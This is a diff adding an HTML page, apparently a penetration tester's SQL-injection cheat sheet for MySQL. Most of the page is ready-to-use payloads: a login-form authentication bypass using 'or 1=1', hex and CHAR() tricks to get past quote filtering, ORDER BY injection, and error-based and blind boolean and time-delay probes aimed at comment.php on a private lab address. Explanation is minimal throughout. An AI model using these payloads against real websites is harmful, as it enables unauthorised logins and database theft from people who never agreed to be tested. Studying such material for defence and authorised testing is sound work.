@@ -1,0 +1,80 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Detection</title>
+</head><body><b><span style="font-size: 12pt">VERSION FEATURES<br/>
+</span></b><span style="font-size: 10pt">From Version 4.0: UNION<br/>
+From Version 4.1: Subqueries<br/>
+From Version 5.0: Stored procedures, Stored functions and the view named INFORMATION_SCHEMA<br/>
+</span><span style="font-size: 10pt">From Version 5.0.2: Triggers</span><span style="font-size: 12pt"><b><br/>
+</b></span><span style="font-size: 12pt"><b><br/>
+</b></span><span style="font-size: 12pt"><b>ERROR BASED</b></span><br/>
+<br/>
+<b>Urlencode all non-alphanumeric characters!<br/>
+If injecting after string field, use both ' and &quot; after the field<br/>
+<br/>
+Basic login form auth bypass<br/>
+</b><tt><br/>
+</tt><tt>someuser' or 1=1 LIMIT 1;#</tt><br/>
+<tt>someuser' or 1=1 LIMIT 1;</tt>--<br/>
+If ' are escaped and query is truncated to fixed length, last ' can be stripped by this truncation. Test with A, AA, AAA, AAAA, ....<br/>
+someuserAAAA' <tt>or 1=1 LIMIT 1;</tt>--<br/>
+<br/>
+<b>Single quote filtering bypass</b><br/>
+<br/>
+Original<tt><br/>
+</tt><tt>password like 'A%</tt>'<br/>
+The ASCII values in a concatenated hex:<br/>
+<tt>password LIKE 0x4125</tt><br/>
+The char() function:<br/>
+<tt>password LIKE CHAR(65,37)</tt><br/>
+<br/>
+<b>Test for SQLi to ORDER BY clause<br/>
+</b><br/>
+Find parameters which control sorting mechanism and inject<br/>
+<tt><br/>
+</tt><tt>1 ASC --</tt><br/>
+<tt>1 DESC --</tt><br/>
+<br/>
+If '1' appears in results in each row returned then '1' is passed as<br/>
+<tt>SELECT 1,title,year FROM books WHERE publisher='Wiley'</tt><br/>
+<br/>
+<br/>
+<b>Test for SQLi vulnerabilty (assuming id is string parameter)</b><tt><br/>
+</tt><tt><br/>
+http://10.11.13.67/comment.php?id=123'<br/>
+http://10.11.13.67/comment.php?id=123''<br/>
+http://10.11.13.67/comment.php?id=123';#<br/>
+http://10.11.13.67/comment.php?id=123'';#<br/>
+http://10.11.13.67/comment.php?id=123';--<br/>
+</tt><tt>http://10.11.13.67/comment.php?id=123'';--</tt><b><span style="font-size: 12pt"><br/>
+</span></b><b><span style="font-size: 12pt"><br/>
+</span>Confirm SQLi vulnerabilty (assuming id is string parameter)<br/>
+</b><tt><br/>
+</tt><tt>http://10.11.13.67/comment.php?id=123'</tt>returns error<br/>
+<tt>http://10.11.13.67/comment.php?id=123''</tt>works<br/>
+<tt>http://10.11.13.67/comment.php?id=100+23 works<br/>
+</tt><tt>http://10.11.13.67/comment.php?id=100+23 works</tt><br/>
+<tt>http://10.11.13.67/comment.php?id=172-ASCII(1) works, gives id=123</tt><b><br/>
+</b><b><br/>
+<span style="font-size: 12pt"><br/>
+</span></b><span style="font-size: 12pt"><b>BLIND</b><br/>
+<br/>
+</span><b>Test for SQLi vulnerabilty - page render difference (assuming id is number parameter)</b><br/>
+<br/>
+We need to look for the different behaviour of the web page<br/>
+<tt><br/>
+http://10.11.13.67/comment.php?id=738 and 1=1<br/>
+http://10.11.13.67/comment.php?id=738 and 1=2<br/>
+http://10.11.13.67/comment.php?id=738 and 1=1;#<br/>
+http://10.11.13.67/comment.php?id=738 and 1=2;#<br/>
+http://10.11.13.67/comment.php?id=738 and 1=1;--<br/>
+http://10.11.13.67/comment.php?id=738 and 1=2;--<br/>
+</tt><br/>
+If both requests gives different result then we could have SQLi<br/>
+<br/>
+<b>Test for SQLi vulnerabilty - time sleep (assuming id is number parameter)<br/>
+</b><br/>
+If response take more then 5 secs we have SQLi<b><br/>
+</b><tt>http://10.11.13.67/comment.php?id=738-sleep(5)<br/>
+</tt></body></html>
